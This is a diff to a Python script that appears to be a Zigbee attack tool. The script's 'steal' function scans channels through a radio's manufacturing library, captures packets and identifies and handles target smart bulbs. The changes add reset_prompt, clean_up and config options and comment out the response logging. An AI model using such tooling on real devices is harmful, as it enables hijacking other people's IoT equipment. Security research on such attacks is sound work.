@@ -33,8 +33,11 @@ async def prepare_config(device_path, baudrate):
     util.check(res[0], "Unable to start mfglib")
     return (dev, eui63)
 
-async def steal(device_path, baudrate, scan_channel):
-    dev, eui64 = await prepare_config(device_path, baudrate)
+async def steal(device_path, baudrate, scan_channel, reset_prompt=False, clean_up=True, config=None):
+    if config:
+        dev, eui64 = config
+    else:
+        dev, eui64 = await prepare_config(device_path, baudrate)
 
     DLT_IEEE802_15_4 = 195
     pcap = pure_pcapy.Dumper("log.pcap", 128, DLT_IEEE802_15_4)
@@ -123,29 +126,30 @@ async def steal(device_path, baudrate, scan_channel):
         else:
             print(f"Found no targets on {channel}")
 
-        while len(targets)>0:
-            handle_targets(dev, eui64, targets)
-
-    print(f"Sent: {sorted(transactions_sent)}")
-    print(f"Received: {sorted(transactions_received)}")
-
+        if reset_prompt:
+            while len(targets)>0:
+                await handle_targets(dev, eui64, targets)
 
     dev.remove_callback(cbid)
 
-    await dev.mfglibEnd()
+    if clean_up:
+        await dev.mfglibEnd()
 
-    dev.close()
+        dev.close()
 
-    print(f"Saving {len(valid_responses)} valid responses")
-    with open('valid_responses.json', 'w') as fp:
-        json.dump(valid_responses, fp)
+    if not reset_prompt:
+        return targets
 
-    try:
-        print(f"Saving {len(invalid_responses)} invalid responses")
-        with open('invalid_responses.json', 'w') as fp:
-            json.dump(invalid_responses, fp)
-    except Exception as exc:
-        print(f"Unable to write errors: {exc}")
+#     print(f"Saving {len(valid_responses)} valid responses")
+#     with open('valid_responses.json', 'w') as fp:
+#         json.dump(valid_responses, fp)
+#
+#     try:
+#         print(f"Saving {len(invalid_responses)} invalid responses")
+#         with open('invalid_responses.json', 'w') as fp:
+#             json.dump(invalid_responses, fp)
+#     except Exception as exc:
+#         print(f"Unable to write errors: {exc}")
 
 async def identify_bulb(dev, eui64, target, transaction_id, channel):
     print(f"Sending flashing identifier packet to {target}")
@@ -207,4 +211,4 @@ if __name__ == "__main__":
     parser.add_argument('-c', '--channel', type=int, help='Zigbee channel (defaults to scanning 11 up to 26)')
     args = parser.parse_args()
 
-    asyncio.get_event_loop().run_until_complete(steal(args.device, args.baudrate, args.channel))
+    asyncio.get_event_loop().run_until_complete(steal(args.device, args.baudrate, args.channel, reset_prompt=True))
